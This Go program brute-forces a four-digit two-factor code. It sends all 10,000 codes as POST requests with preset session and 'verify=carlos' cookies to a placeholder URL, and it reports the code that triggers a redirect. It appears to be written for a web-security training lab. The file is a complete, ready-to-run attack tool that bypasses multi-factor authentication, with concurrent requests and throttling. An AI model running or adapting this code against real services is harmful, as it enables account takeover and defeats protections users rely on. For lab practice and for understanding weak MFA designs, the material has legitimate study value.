package main

import (
	"bytes"
	"fmt"
	"log"
	"math"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"sync"
	"syscall"
	"time"
)

var processBar = []string{
	"00%: [                                          ]",
	"05%: [##                                        ]",
	"10%: [####                                      ]",
	"15%: [######                                    ]",
	"20%: [########                                  ]",
	"25%: [##########                                ]",
	"30%: [############                              ]",
	"35%: [##############                            ]",
	"40%: [################                          ]",
	"45%: [##################                        ]",
	"50%: [####################                      ]",
	"55%: [######################                    ]",
	"60%: [########################                  ]",
	"65%: [##########################                ]",
	"70%: [############################              ]",
	"75%: [##############################            ]",
	"80%: [################################          ]",
	"85%: [##################################        ]",
	"90%: [####################################      ]",
	"95%: [######################################    ]",
	"100%:[##########################################]",
}

func init() {
	// Control + C
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		// Run Cleanup
		fmt.Print("\n\n[!] Saliendo...\n")
		os.Exit(1)
	}()

	// Init function to creation of cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalf("Got error while creating cookie jar %s", err.Error())
	}
	client = http.Client{
		Jar: jar,
	}
}

func sendRequest(mfa_code string, req *http.Request) int {

	t := &http.Transport{
		Dial: (&net.Dialer{
			Timeout:   90 * time.Second,
			KeepAlive: 60 * time.Second,
		}).Dial,

		TLSHandshakeTimeout: 90 * time.Second,
	}
	client := &http.Client{
		Transport: t,
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Error occured. Error is: %s", err.Error())
	}
	defer resp.Body.Close()

	if resp.Request.Response != nil && resp.Request.Response.StatusCode == 302 {
		fmt.Print("\n\nCodigo: ", mfa_code, "\n\n")
		os.Exit(0)
	}

	wg.Done()
	return resp.StatusCode

}

// WaitGroup is used to wait for the program to finish goroutines.
var wg sync.WaitGroup

var client http.Client
var main_url = "http://url"
var resource = "/path"

var cookie1 = &http.Cookie{
	Name:  "session",
	Value: "h27VvBgQY2s0hSxKCh7R2iWj285uW8BU",
}
var cookie2 = &http.Cookie{
	Name:  "verify",
	Value: "carlos",
}

func main() {

	fmt.Println("URL:>", main_url)
	fmt.Println("URL:>", resource)
	fmt.Print("Cookies:\n")
	fmt.Print("\t", cookie1, "\n")
	fmt.Print("\t", cookie2, "\n")
	time.Sleep(3 * time.Second)

	j := 0
	for i := 0; i < 10000; i++ {

		if math.Mod(float64(i), 500) == 0 {
			j += 1
		}
		fmt.Print("\033[H\033[2J")
		fmt.Printf("%s -> mfa-code: %d - 10000\n", processBar[j], i)

		wg.Add(1)

		mfa_code := fmt.Sprintf("%04d", i)

		data := url.Values{}
		data.Set("mfa-code", mfa_code)

		u, _ := url.ParseRequestURI(main_url)
		u.Path = resource
		u.RawQuery = data.Encode()
		urlStr := fmt.Sprintf("%v", u)

		r, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

		// r.Header.Add("Authorization", "auth_token=\"XXXXXXX\"")
		r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

		r.AddCookie(cookie1)
		r.AddCookie(cookie2)

		go sendRequest(mfa_code, r)

		// Timeout to dont saturate de server
		if math.Mod(float64(i), 10) == 9 {
			time.Sleep(time.Millisecond * 180)
		}
	}

	wg.Wait()

}
